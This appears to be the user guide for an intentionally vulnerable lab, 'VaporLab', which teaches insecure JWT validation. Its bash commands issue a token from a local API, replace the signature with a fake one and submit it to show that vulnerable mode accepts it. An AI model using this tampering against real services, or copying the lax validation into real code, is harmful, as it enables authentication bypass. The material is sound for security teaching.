# VaporLab User Guide

## Installation
1. Start the API in development mode.
2. Confirm service health with `GET /healthz`.

## Sprint 1 Feature: JWT Issuing
Use the auth issue endpoint to get a baseline JWT token.

### Request
```bash
curl -s -X POST http://localhost:8080/auth/jwt/issue \
  -H 'content-type: application/json' \
  -d '{"user_id":"42"}'
```

### What to expect
- Response contains `token` with format `header.payload.signature`.
- Decoded payload contains `sub`, `role`, `iat`, and `exp` claims.

## Sprint 1 Feature: Insecure JWT Validation
The lab intentionally accepts tampered signatures in vulnerable mode.

### Tamper and validate
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/auth/jwt/issue -H 'content-type: application/json' -d '{"user_id":"42"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
HEADER_PAYLOAD=$(echo "$TOKEN" | awk -F'.' '{print $1"."$2}')
TAMPERED="${HEADER_PAYLOAD}.tampered-signature"

curl -s -X POST http://localhost:8080/auth/jwt/validate \
  -H 'content-type: application/json' \
  -d "{\"token\":\"${TAMPERED}\"}"
```

### What to expect
- Vulnerable mode: response indicates token is valid.
- Secure mode: same token is rejected with unauthorized response.

## Next Lab Steps
Continue with upcoming auth roadmap commits for secure mode toggle and OIDC flows.
